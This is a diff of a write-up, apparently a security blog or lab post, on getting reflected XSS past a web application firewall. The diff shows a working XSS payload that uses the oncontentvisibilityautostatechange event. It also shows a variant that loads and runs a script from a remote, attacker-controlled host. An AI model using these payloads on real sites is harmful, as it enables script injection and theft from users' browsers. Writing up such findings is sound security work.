@@ -36,13 +36,11 @@ Hence, I tried single payload possible from PortSwigger's XSS Cheat Sheet before
 
 I used Burp Intruder to do so, and eventually found one payload that was not blocked:
 
-{% code overflow="wrap" %}
 
 ```html
 <address oncontentvisibilityautostatechange=alert(1) style=display:block;content-visibility:auto>
 ```
 
-{% endcode %}
 
 ![](../../.gitbook/assets/reflected-xss-waf-image-2.png)
 
@@ -54,13 +52,11 @@ My initial idea was to change `alert(1)` to `fetch`. This sent requests to other
 
 Eventually, I decided to host the script elsewhere using sites like `webhook.site` or `ssrf.cvssadvisor.com`. The XSS payload was modified to make the browser fetch and execute the remote script:
 
-{% code overflow="wrap" %}
 
 ```html
 <address oncontentvisibilityautostatechange="let s=document.createElement('script');s.src='PAYLOAD_WEBSITE_HERE';document.head.appendChild(s)" style="display:block;content-visibility:auto">
 ```
 
-{% endcode %}
 
 The above code worked because there was no CSP for this endpoint. This was the code hosted remotely (code has been heavily redacted):
 
